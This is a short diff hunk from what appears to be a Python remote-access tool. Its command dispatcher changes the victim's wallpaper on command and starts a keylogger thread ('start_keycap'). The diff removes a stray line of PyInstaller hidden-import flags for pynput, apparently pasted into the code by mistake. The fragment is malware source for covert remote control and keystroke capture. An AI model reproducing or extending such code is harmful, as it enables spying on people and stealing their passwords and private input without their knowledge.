@@ -165,7 +165,6 @@ Processor: {uname.processor}
 
 			elif cmd[:11] == "chwallpaper":
 				self.__change_wallpaper(cmd[12:])
-		 --hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32
 			elif cmd == "start_keycap":
 				Thread(target=self.klogger.start_dumps).start()
 				pass
